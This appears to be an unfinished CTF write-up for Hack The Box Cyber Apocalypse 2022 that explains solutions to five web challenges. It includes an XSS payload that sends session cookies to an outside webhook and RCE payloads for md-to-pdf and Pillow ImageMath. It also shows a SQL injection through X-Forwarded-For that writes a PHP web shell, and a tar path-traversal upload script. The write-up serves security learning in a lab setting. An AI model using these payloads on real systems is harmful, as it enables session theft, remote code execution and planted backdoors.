# Hack The Box - Cyber Apocalypse

A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.

Each writeup include the given source file with a docker setup. I might've added few debuging outputs to the source files, which shouldn't impact the challenge itself.

------------

- [Pwn](#pwn)
	-  [Space Pirate: Entrypoint](#pwn1 "Space Pirate: Entrypoint")
	-  [Space pirate: Going Deeper](#pwn2)
	-  [Space pirate: Retribution](#pwn3)
	-  [Vault-breaker](#pwn4)
	-  [Fleet Management](#pwn5)
	-  [Hellbound](#pwn6)
	-  [Trick or Deal](#pwn7)
- [Web](#web)
	-  [Kryptos Support](#web1)
	-  [BlinkerFluids](#web2)
	-  [Amidst Us](#web3)
	-  [Intergalactic Post](#web4)
	-  [Acnologia Portal](#web5)
	-  [Red Island](#web6)
	-  [Mutation Lab](#web7)
- [Rev](#rev)
	-  [WIDE](#rev1)
- [Misc](#misc)
	-  [Compressor](#misc1)

------------

### Pwn
1. <p name="pwn1">Space Pirate: Entrypoint (★☆☆☆)</p>

2. <p name="pwn2">Space Pirate: Going Deeper (★☆☆☆)</p>

3. <p name="pwn3">Space pirate: Retribution (★☆☆☆)</p>

4. <p name="pwn4">Vault-breaker (★☆☆☆)</p>

5. <p name="pwn5">Fleet Management (★☆☆☆)</p>

6. <p name="pwn6">Hellbound (★★☆☆)</p>

7. <p name="pwn7">Trick or Deal (★★☆☆)</p>


<br/>

### Web
1. <p name="web1">Kryptos Support (★☆☆☆)</p>
For this challenge we were given a website with a `/login` & `/signup` pages. Upon signing up, we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web1.png'>
</p>

So, this should be a basic XSS since we didn't even get a source code. Going for a basic payload:

```html
<script>
    fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

Gives us the moderator's cookies! Having a look on them, we see a session cookie.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/session_web1.png'>
</p>

We add the session & we visit `/settings`. The magic happens & we are logged in. 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/settings_web1.png'>
</p>

There is no flag yet? We apparently need to access something higher, maybe an admin account? So we try the change password functionality & we have a look on the HTTP Request. We see that we are sending the UID in the request body:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/request_web1.png'>
</p>

Trying to find the admin ID, we change the UID to 1 & send our HTTP Request. We get a confirmation from the server:

```json
{
    "message": "Password for admin changed successfully!"
}
```

We login as the admin now & we get our flag: 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web1.png'>
</p>

<br/>

2. <p name="web2">BlinkerFluids (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/)). Looking into the website, we see an invoice list & an option to add a new invoice.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web2.png'>
</p>

If we try to create a new invoice, we get a nice default text that is formated with Markdown Language.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/new_invoice_web2.png'>
</p>

Now, let's dig into the source code. Starting with the [/routes/index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/routes/index.js), we see that the creation of an invoice uses an MDHelper.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/routes_web2.png'>
</p>

We then head to our helper file, located at [/helpers/MDHelper.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/helpers/MDHelper.js)

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/helpers_web2.png'>
</p>

So, if we consider our possible attack vectors, our main target will be the `md-to-pdf` module. So this will be our start!

The first thing we get related to security issues for this module will be `CVE-2021-23639`. It involves a Remote Code Execution caused by the gray-matter's JS-engine, which is enabled by default. This was fixed in version 5.0.0 of `md-to-pdf` but if we check [/package.json](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/package.json), we see that we are using version `4.1.0` so we got our exploit :)

For a proof of concept & more information, you can refer to these links:
- [Link 1](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- [Link 2](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

We have access to `/static` route which means, we can use it to write our command output there. Our final payload will be:

```
---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---
```

& we'll be able to access `/static/flag` route & get our flag: `HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

<br/>

3. <p name="web3">Amidst Us (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/)). We get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web3.png'>
</p>

We click on the picture in the center & it'll prompt us to select a file to upload. Upon selecting a picture, we see that the white areas become transparent, so this is somekind of a picture converter. Let's have a look on the source code for this.

As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/util.py). I've edited the source a little to help me debug the payload. The interesting part is the following:

```python
def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]
		
		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)
```

<br>

The rest of the function isn't important.<br/>So if we read the code, we can see that there is a `ImageMath.eval` that takes a string which contains `float` & `max` functions, this appears to be a python code maybe? We might use this part in order to get an RCE. Where is our input part?

We start first by viewing the HTTP requests. We see that we are sending a JSON object with 2 attributes:

```json
{
	"image":"iVBORw0K...............",
	"background":[255,255,255]
}
```

The image is sent as a base 64 string, we see that there is a background attribute too. If we check the [routes](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) file again, we see that our input is passed directly to the helper function, without any validation.

```python
@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json)
```

Now, we see that the `background` attribute is being used in the helper function & it's passed into the `ImageMath.eval` call:

```python
color = data.get('background', [255,255,255])
```

& since there is no validation, we can inject anything into the `color` array!

Before that, let's try to gather a bit more information about this method. A quick google search would land us on a `CVE-2022-22817` & we get the following ([Source](https://vuldb.com/?id.189840)):

> PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method.

Having a quick look at [/requirements.txt](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/requirements.txt), we see that we are using `Pillow 8.4.0` & now, we got our RCE confirmed.

As a start, I thought of crafting a payload to close the `max` & `float` calls then inject my code to be executed but after debuging a little bit, it was hell. I had to figure an other way to inject the code...

After a while, I remembered that we already know the flag's path. Also, I remembered that the `file.write` function returns the number of characters written into a file. So if we inject a `open().write` call, we'll get our code executed + return an integer to keep the execution of the helper function working. Combining that with a `open().read`, we can extract our flag into a public route, `/static`.

Of course, we can pop a shell by importing os & executing shell commands but meh, we know where our flag is so let's grab it & go.

We end up with a final payload:

```json
{
	"image":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAGgwJ/lK3Q6wAAAABJRU5ErkJggg==",
	"background":[
		255,
		"open('/app/application/static/flag', 'w').write(open('/flag.txt').read())",
		255
	]
}
```

& we get our flag in `/static/flag`: `HTB{i_slept_my_way_to_rce}`

<br/>

4. <p name="web4">Intergalactic Post (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/)). We get the following home page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web4.png'>
</p>

A simple page for email subscription, nothing more... We'll have to check the code for this one, we see that we got a PHP server. Checking the provided controllers, we can directly check the [/controllers/SubsController.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php) file. We mainly have 2 functionalities:

```php
    public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }

    public function logout($router)
    {
        session_destroy();
        header('Location: /admin');
        exit;
    }
```

Let's focus on the subscription part, we see that our given email is validated using `filter_var($email, FILTER_VALIDATE_EMAIL)`, so as a start, we check PHP documentation ([ref](https://www.php.net/manual/en/function.filter-var.php)) but there is nothing interesting for now... 

Moving on, we'll check our `SubscriberModel` class, located at [/models/SubscriberModel.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php)

Now, we see some interesting code:

```php
    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
```

We see that the `$ip_address` isn't validated, so that should be our attack vector? Checking the `getSubscriberIP()` method, it's basically extracting the IP from the request header, `X-Forwarded-For`, if included. And this will be our SQL injection, but what kind of database are we using?

Checkig [/Database.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/Database.php), we see that we are using SQLite, we also confirm that the `subscribeUser` method is vulnerable to SQL Injection

```php
    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
```

And if you're not familliar with SQLite, it's a file based database, which means, we have the possibility to write files. This explains the change of NodeJS to a PHP app, we are in the correct path.

We can basically create a new database file in a public path (`/www/`), insert a php code in it & when we visit it, it'll be executed.

That's translated in SQL with this:

```SQL
attach '/www/door.php' as bd; 
create table bd.rce(cc text); 
insert into bd.rce values('<?php echo system($_GET["c"]); ?>');
```

Now, we'll inject this using our headers. We add a `X-Forwarded-For` to our subscription post request:

```http
X-Forwarded-For: hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f
```

which will result in the following query to be executed:

```SQL
INSERT INTO subscribers (ip_address, email) VALUES('hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f', 'myemail@hi.rce')
```

The `--` is used as a one line comment in SQL.

And that, gives us a backdoor file at `/door.php`. We find the flag file & get it's content: `HTB{inj3ct3d_th3_tru7h}`

<br/>

5. <p name="web5">Acnologia Portal (★★☆☆)</p>
Moving to the next one, we get a Flask app source code for this one  ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/)). We get a login page with the option of account creation, so we signup & connect:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web5.png'>
</p>

After logging in, we get a 'Firmware List' with an option to report a bug:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/firmware_list_web5.png'>
</p>

Going for the report option, we get a report form, simillar to the Kryptos Support.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web5.png'>
</p>

I doubt this'll be a normal XSS. Going for the basic payload

```html
<script>
	fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

But we get an empty response:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/webhook_web5.png'>
</p>

Looking at the source code, we see an option to upload a Firmware:

[Routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/blueprints.py)
```python
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401
    
    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response(request.files['file'].filename), 403
```
<br/>

[Util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/util.py)
```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)
    
    with open(path, 'rb') as f:
        d = f.read()

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

So we are uploading a tar file & extracting it's content without any validation, which leads us to a Zip-Slip. Since the flag path is known, I decided to simply upload a link file to a public location (`/static`).

Starting with our file payload, I created a link file to /flag.txt (`ln -s /flag.txt`) then I used this script to create the tar file:

```python
import tarfile

tar = tarfile.open(path, 'w:gz')
tar.add('flag_link', '../../../../../../app/application/static/flag')
tar.close()
```

Now, the upload part... When you're uploading a file, the selected file is transformed into a `File` object, which is sent to the server. So I searched for how to actually create a `File` instance & set it's content.

After a bit of searching, I ended up with the following

```javascript
// File content b64 encoded, atob decodes base 64 strings
let content = atob('H4sICHqTg2IC/3Rlc3QudGFyAO3TT0vDMBjH8Zx9FTkI00uStmm34Z95ET168CZDQi02YNeyRpjv1KPvZLbu4BDUgzh0+36S8IQ8gRzCT2mlz67c4rJwd8Vc/Aqz8lk1JrHv+/48MnEUC7kQG/DYBjfvnhe7KR7JKviqOImyNO6Htcom43EySvYEtp7Sam26punXg89d8PVMd9kIPtelV03Z/Cj/mX3LeDRMzXpdsR/znw3TVEizyfxX9ezef3Hvu/4/tXxevhxPut+VRV7Wsn1qQ1Ed7N9enF/fDPLB9PBockpKAAAAAAAAAAAAAAAA/q5XAWe8/gAoAAA=')
n = content.length;

// Will be used to store the decoded bytes & used in the File constructor.
u8arr = new Uint8Array(n);

// Just transfer the string to the UInt8Arr
while(n--){
    u8arr[n] = content.charCodeAt(n);
}

// Create File object
f = new File([u8arr], "payload.tar", {type: "application/x-tar" });

// Setup form data to be sent
const formData = new FormData();
formData.append('file', f);

await fetch('http://localhost:1337/api/firmware/upload', {
    method: 'POST',
    body: formData })

```

And we get our link file at `/static/flag` ! Flag: `HTB{des3r1aliz3_4ll_th3_th1ngs}`

* Notes:
	- There was the possibility of gaining an RCE using the Pickle serialization problem by overwriting the flask session file.

<br/>

6. <p name="web6">Red Island (★★☆☆)</p>

7. <p name="web7">Mutation Lab (★★☆☆)</p>

<br/>

### Rev
1. <p name="rev1">WIDE (★☆☆☆)</p>

<br/>

### Misc
1. <p name="misc1">Compressor (★☆☆☆)</p>


WIP